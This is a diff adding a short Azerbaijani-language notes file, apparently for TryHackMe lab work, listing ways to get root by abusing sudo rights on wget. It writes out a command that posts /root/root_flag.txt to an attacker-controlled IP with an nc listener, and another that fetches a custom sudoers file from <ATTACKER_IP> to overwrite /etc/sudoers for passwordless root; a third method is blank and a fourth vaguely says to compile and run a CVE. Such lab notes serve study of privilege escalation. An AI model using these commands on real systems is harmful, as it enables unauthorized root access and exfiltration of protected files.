@@ -1,0 +1,39 @@
+1 ci yol
+
+SUDO olan WGET ilə necə root olmaq olar 
+Hücum etdiyimiz sistemin terminalında:sudo /usr/bin/wget — post-file=/root/root_flag.txt http://<your TryHackMe Ip adres here>: <Port number>
+Öz terminalımızda: nc -nlvp <Port number>
+
+
+2 ci yol
+
+/etc/sudoers faylı istifadəçinin və qrupdakı istifadəçilərin nə edə biləcəyini idarə edir. Təcavüzkar maşınımda istifadəçiyə 'user'ə
+parol olmadan istənilən istifadəçi kimi istənilən əmri yerinə yetirmək imkanı verən xüsusi sudoers faylı yaratdım.
+
+Faylı ötürmək üçün python serverdən istifadə edə bilərik python3 -m http.server 
+
+Uzaq maşında xüsusi sudoers faylını endirdim və onu /etc/sudoers-da saxladım (Bu, sudoers faylının standart yeridir).
+
+(Normal olaraq, yalnız root /etc/sudoers faylını dəyişdirə bilər. Lakin, biz wget-i root kimi işlədə bildiyimiz üçün 
+biz sudoers faylını hücumçu maşından yükləyə və qurban maşınında /etc/sudoers-da saxlaya bilərik.)
+
+
+özünüzdə olan faylı wget ilə digər sistemə atmaq üçün bu əmrdən istifadə edirik 
+sudo /usr/bin/wget <ATTACKER_IP>:8000/<CUSTOM_SUDOERS_FILE> -O /etc/sudoers 
+beləliklə user sudoers faylındadadır və parolsuz roota keçə bilərik 
+
+3 cü yol
+özümüz bir 
+
+
+
+
+
+
+
+
+
+4 cü yol cve istifadə edərək 
+gcc <simple cve> -o istifadəedərək c kodunu maşın dilinə çeviririk 
+sonra ./CVE 
+bu qədər
